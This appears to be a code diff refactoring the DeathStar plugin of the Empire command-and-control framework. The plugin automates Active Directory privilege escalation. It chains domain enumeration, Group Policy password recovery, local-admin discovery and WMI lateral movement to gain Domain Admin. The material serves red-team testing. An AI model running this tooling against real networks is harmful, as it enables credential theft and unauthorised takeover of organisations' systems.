@@ -1,42 +1,27 @@
 from __future__ import print_function
 
 import logging
+from typing import override
 
 from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
-from empire.server.common.plugins import Plugin
+from empire.server.core.plugins import BasePlugin
 from empire.server.core.db import models
-from empire.server.core.db.base import SessionLocal
 from empire.server.core.db.models import PluginTaskStatus
 from empire.server.core.hooks import hooks
 from empire.server.core.plugin_service import PluginService
 from empire.server.plugins.DeathStarPlugin.run_tasks import DeathStarTasks
 from empire.server.plugins.DeathStarPlugin.utils import (
     posh_object_parser,
-    posh_table_parser,
 )
 
 log = logging.getLogger(__name__)
 
 
-class Plugin(Plugin):
-    def onLoad(self):
-        self.info = {
-            'Name': 'deathstar',
-            "Authors": [
-                {
-                    "Name": "Anthony Rose",
-                    "Handle": "@_Cx01N",
-                    "Link": "https://twitter.com/_Cx01N",
-                }
-            ],
-            'Description': ('Automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs'),
-            'Software': '',
-            'Techniques': [],
-            'Comments': [
-                'https://github.com/byt3bl33d3r/DeathStar',
-            ]
-        }
-        self.options = {
+class Plugin(BasePlugin):
+
+    @override
+    def on_load(self, db):
+        self.execution_options  = {
             'Agent': {
                 'Description': 'Name of Agent',
                 'Required': True,
@@ -45,16 +30,14 @@ class Plugin(Plugin):
 
         }
 
+    @override
     def execute(self, command, **kwargs):
-        """
-        Parses commands from the API
-        """
         try:
             agent_name = command['Agent']
             user = kwargs["user"]
             db = kwargs["db"]
 
-            input = f"""
+            deathstar_input = r"""
         _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
         |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
         |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
@@ -65,11 +48,11 @@ class Plugin(Plugin):
          Maintained by: Cx01N                                                                      
         """
             plugin_task = models.PluginTask(
-                plugin_id=self.info["Name"],
-                input=input,
-                input_full=input,
+                plugin_id=self.info.id,
+                input=deathstar_input,
+                input_full=deathstar_input,
                 user_id=user.id,
-                status=PluginTaskStatus.completed,
+                status=PluginTaskStatus.started,
             )
             plugin_task.output = f"[*] Starting Recon Scan: {agent_name}\n"
             db.add(plugin_task)
@@ -95,16 +78,16 @@ class Plugin(Plugin):
 
         except Exception as e:
             log.error(e)
-            self.plugin_service.plugin_socketio_message(self.info["Name"], f"[!] {e}")
+            self.send_socketio_message(f"[!] {e}")
             return False
 
-    def register(self, main_menu):
-        self.installPath = main_menu.installPath
-        self.main_menu = main_menu
-        self.plugin_service: PluginService = main_menu.pluginsv2
+    @override
+    def on_start(self, db):
+        self.install_path = self.main_menu.installPath
+        self.plugin_service: PluginService = self.main_menu.pluginsv2
         self.task_ids = {}
         self.domain_controllers = None
-        self.DeathStarTasks = DeathStarTasks(self.main_menu)
+        self.deathstar_tasks = DeathStarTasks(self.main_menu)
 
         hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_sid", self.get_domain_sid)
         hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_admin", self.get_domain_admin)
@@ -115,22 +98,33 @@ class Plugin(Plugin):
         hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_wmi", self.get_invoke_wmi)
         hooks.register_hook(hooks.AFTER_AGENT_CHECKIN_HOOK, 'on_new_agent_checkin', self.on_new_agent_checkin)
 
+    def get_task(self, db, task_id: int):
+        plugin = self.plugin_service.get_by_id(db, 'deathstar')
+        if plugin:
+            task = (
+                db.query(models.PluginTask)
+                .filter(models.PluginTask.id == task_id)
+                .first()
+            )
+            if task:
+                return task
+
+        return None
     def on_new_agent_checkin(self, db, task):
         if 'wmi' in self.task_ids:
-            plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+            plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += f"[+] Access gained to {task.hostname}\n"
             db.add(plugin_task)
             db.flush()
 
-            # Clear task list if successful
             self.task_ids = {}
 
     def get_invoke_wmi(self, db, task):
         if 'wmi' in self.task_ids:
             if task.id in self.task_ids['wmi']:
                 if task.output:
-                    plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
-                    plugin_task.output += f"{task.output.decode('UTF-8')}\n"
+                    plugin_task = self.get_task(db, self.plugin_task_id)
+                    plugin_task.output += f"{task.output}\n"
                     db.add(plugin_task)
                     db.flush()
 
@@ -144,17 +138,16 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Find-LocalAdminAccess completed" not in task.output:
+        if "Find-LocalAdminAccess completed" not in task.output:
             return
 
-        # Now the primary logic of the function starts here, without deep nesting
-        self.localadmin_access = task.output.decode('utf-8').split("\r\n")[:-3]
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        self.localadmin_access = task.output.split("\r\n")[:-3]
+        plugin_task = self.get_task(db, self.plugin_task_id)
         plugin_task.output += f"[+] Local Admin Access found\n"
         self.task_ids['wmi'] = []
         for computer_name in self.localadmin_access:
             self.task_ids['wmi'].append(
-                self.DeathStarTasks.run_invoke_wmi(db, self.session_id, self.listener_name, computer_name))
+                self.deathstar_tasks.run_invoke_wmi(db, self.session_id, self.listener_name, computer_name))
             plugin_task.output += f"[*] Attempting Invoke-WMI to {computer_name}\n"
             db.add(plugin_task)
             db.flush()
@@ -166,12 +159,11 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Get-DomainSID completed" not in task.output:
+        if "Get-DomainSID completed" not in task.output:
             return
 
-        # The primary logic starts here without deep nesting
-        group_sid = task.output.split()[0].decode("UTF-8")
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        group_sid = task.output.split()[0]
+        plugin_task = self.get_task(db, self.plugin_task_id)
 
         if group_sid == "Get-DomainSID":
             plugin_task.output += "[!] No Group SID found\n"
@@ -180,11 +172,11 @@ class Plugin(Plugin):
             return
 
         plugin_task.output += f"[+] Group SID: {group_sid}\n"
-        self.task_ids['domain_admin'] = self.DeathStarTasks.run_get_group_member(db, group_sid + "-512",
-                                                                                 self.session_id)
-        self.task_ids['enterprise_admin'] = self.DeathStarTasks.run_get_group_member(db, group_sid + "-519",
-                                                                                     self.session_id)
-        self.task_ids['domain_controller'] = self.DeathStarTasks.run_get_domain_controller(db, self.session_id)
+        self.task_ids['domain_admin'] = self.deathstar_tasks.run_get_group_member(db, group_sid + "-512",
+                                                                                  self.session_id)
+        self.task_ids['enterprise_admin'] = self.deathstar_tasks.run_get_group_member(db, group_sid + "-519",
+                                                                                      self.session_id)
+        self.task_ids['domain_controller'] = self.deathstar_tasks.run_get_domain_controller(db, self.session_id)
 
     def get_domain_controller(self, db, task):
         if 'domain_controller' not in self.task_ids:
@@ -196,18 +188,17 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Get-DomainController completed" not in task.output:
-            plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        if "Get-DomainController completed" not in task.output:
+            plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += "[!] No Domain Controllers found\n"
             return
 
-        # Main logic starts here, with reduced nesting
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
-        self.domain_controllers = posh_object_parser(task.output.decode('utf-8'))
+        plugin_task = self.get_task(db, self.plugin_task_id)
+        self.domain_controllers = posh_object_parser(task.output)
         plugin_task.output += f"[+] Domain Controllers found\n"
         db.add(plugin_task)
         db.flush()
-        self.task_ids['gpp'] = self.DeathStarTasks.run_get_gpp(db, self.session_id)
+        self.task_ids['gpp'] = self.deathstar_tasks.run_get_gpp(db, self.session_id)
 
     def get_domain_admin(self, db, task):
         if 'domain_admin' not in self.task_ids:
@@ -219,14 +210,13 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Get-DomainGroupMember completed" not in task.output:
-            plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        if "Get-DomainGroupMember completed" not in task.output:
+            plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += "[!] No Domain Admins found\n"
             return
 
-        # Main logic starts here, with reduced nesting
-        self.domain_admins = posh_object_parser(task.output.decode('utf-8'))
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        self.domain_admins = posh_object_parser(task.output)
+        plugin_task = self.get_task(db, self.plugin_task_id)
         plugin_task.output += f"[+] Domain Admins found\n"
         db.add(plugin_task)
         db.flush()
@@ -241,14 +231,13 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Get-DomainGroupMember completed" not in task.output:
-            plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        if "Get-DomainGroupMember completed" not in task.output:
+            plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += "[!] No Enterprise Admins found\n"
             return
 
-        # Primary logic of the function starts here, without deep nesting
-        self.enterprise_admins = posh_object_parser(task.output.decode('utf-8'))
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        self.enterprise_admins = posh_object_parser(task.output)
+        plugin_task = self.get_task(db, self.plugin_task_id)
         plugin_task.output += f"[+] Enterprise Admins found\n"
         db.add(plugin_task)
         db.flush()
@@ -263,13 +252,12 @@ class Plugin(Plugin):
         if not task.output:
             return
 
-        if b"Get-GPPPassword completed" not in task.output:
-            plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        if "Get-GPPPassword completed" not in task.output:
+            plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += "[!] No GPOs found\n"
             return
 
-        # Main logic of the function starts here, with reduced nesting
-        parsed = posh_object_parser(task.output.decode('utf-8'))
+        parsed = posh_object_parser(task.output)
         gpo = {}
         for gpo in parsed:
             gpo["guid"] = gpo["file"].split("\\")[6][1:-1]
@@ -282,7 +270,7 @@ class Plugin(Plugin):
                 for user in gpo["usernames"]
             ]
 
-        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+        plugin_task = self.get_task(db, self.plugin_task_id)
 
         if gpo:
             plugin_task.output += "[+] GPP Password found\n"
@@ -290,11 +278,12 @@ class Plugin(Plugin):
             plugin_task.output += "[!] No GPOs found\n"
         db.add(plugin_task)
         db.flush()
-        self.task_ids['local_admin'] = self.DeathStarTasks.run_find_localadmin(db, self.session_id,
-                                                                               self.domain_controllers[0]['name'],
-                                                                               self.domain_controllers[0]['domain'])
+        self.task_ids['local_admin'] = self.deathstar_tasks.run_find_localadmin(db, self.session_id,
+                                                                                self.domain_controllers[0]['name'],
+                                                                                self.domain_controllers[0]['domain'])
 
-    def shutdown(self):
+    @override
+    def on_stop(self, db):
         """
         Kills additional processes that were spawned
         """
